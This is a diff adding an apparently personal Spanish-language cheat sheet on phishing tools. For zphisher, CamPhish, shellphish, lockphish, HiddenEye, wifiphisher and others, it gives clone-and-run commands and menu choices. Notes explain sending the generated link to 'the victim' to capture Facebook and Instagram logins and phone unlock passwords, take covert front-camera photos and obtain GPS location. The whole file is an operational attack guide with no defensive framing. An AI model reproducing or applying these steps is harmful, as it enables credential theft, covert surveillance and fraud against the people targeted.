@@ -1,0 +1,110 @@
+------------------------------------------
+////////////////////////////////////////////////////////////////////////////////////////////
+////// PHISHIM  /////////////////
+//////////////////////////////////////////////////////////////////////////////////////
+
+ZPHISHER //funciona
+git clone https://github.com/htr-tech/zphisher
+cd zphisher
+chmod +x zphisher.sh
+bash zphisher.sh
+1  //para seleccionar facebook
+2  //para que sea la pagina de login de facebook
+2  //que el link quede accesible desde afuera del dispositivo atacante
+https://noticiasseguridad.com/tutoriales/crear-paginas-de-phishing-de-29-sitios-en-pocos-minutos/
+
+sudo su    //para quedar como super usuario de kalilinux
+setxkbmap es sundeadkeys   //poner el teclado en espa�ol
+
+CAMPHISH // captura foto de camara frontal de el dispositivo que ve el link
+git clone https://github.com/techchipnet/CamPhish
+cd CamPhish
+chmod +x camphish.sh
+./camphish.sh
+1 //puede ser 1 o 2
+2
+IUuUdXni1Zc  //copiamos de la url lo que va despues de watch=
+   ...  //el link que nos arroje se envia a la victima y este tomara fotos hasta que la victima deje de ver el video
+
+
+SHELLPHISH  //pishim de facebook y otros PIDE USUARIO DE GITHUB
+git clone https://github.com/thelinuxchoice/shellphish
+cd shellphish
+bash shellphish.sh
+choose an options: 2
+choose a port forwarding option: 1
+or using tinyurl :  //copiamos esta url y la enviamos a la victima
+
+
+SHELLPHISH
+1.- pkg install git
+
+2.
+- git clone�
+https://github.com/Pericena/shellphish.git
+3.
+- cd shellphish
+4.
+- chmod +x shellphish.sh
+5.
+- ./shellphish.sh
+6.
+- pkg install php
+7.
+- pkg install wget
+8.
+- pkg install curl
+9.
+- pkg install ssh
+10.
+- pkg install SSH
+11.
+- pkg install openssh
+12.
+- ./shellphish
+
+LOCKPHISH  //captura contrase�a de un celular PIDE USUARIO Y CONTRASE�A DE GITHUB
+git clone https://github.com/thelinuxchoice/lockphish
+cd lockphish
+bash lockphish.sh //luego genera el link donde la victima ingresara su contrase�a de android, ios o windows
+https://www.youtube.com/watch?v=PTjP35heg7A
+
+
+ZEEKER  //me falta por probar, aparentemente muestra la ubicacion de la persona
+https://github.com/thewhiteh4t/seeker 
+
+HIDDENEYE //no me sirvio tenia que usar pip3 para la instalacion y no supe como
+git clone https://github.com/DarkSecDevelopers/HiddenEye    // Fishim
+cd HiddenEye
+python HiddenEye.py
+y
+8 //para instagra
+4
+your chouse : n
+redirrect here : www.google.com
+2  //para que el link sea de serveo
+your choose : 2
+https://www.youtube.com/watch?v=geOgikV76yk
+
+WIFIPHISHER  //requiere una antena usb
+git clone https://github.com/wifiphisher/wifiphisher      //con este programa se puede hacer fishin con el fin de obtener usuarios y contrase�as
+cd wifiphisher
+chmod +x setup.py
+sudo python setup.py install
+https://www.youtube.com/watch?v=EIF81nmHa1k
+
+EMAILSPOOFING  //no encontre videos de este programa
+git clone https://github.com/TermuxHacking000/EmailSpoofing
+
+scPH1S1N9
+Script Phising ,Facebook,Instagram //no hay videos de este programa
+apt update && apt upgrade
+apt install figlet
+apt install toilet
+gem install lolcat
+git clone https://github.com/InYourG00D1/scPH1S1N9
+cd scPH1S1N9
+sh PhisingV2.sh
+PHISHIN CON UBICACION GPS
+https://noticiasseguridad.com/tutoriales/como-crear-un-sitio-web-falso-para-obtener-la-ubicacion-gps-precisa-de-cualquier-usuario-en-ios-android-y-windows/?fbclid=IwAR2RFCDVUYmEoMw61Dwkw2IyfAAQq9JKK1bE-KjG-0P5XhDf8utu7s_nRe0
+
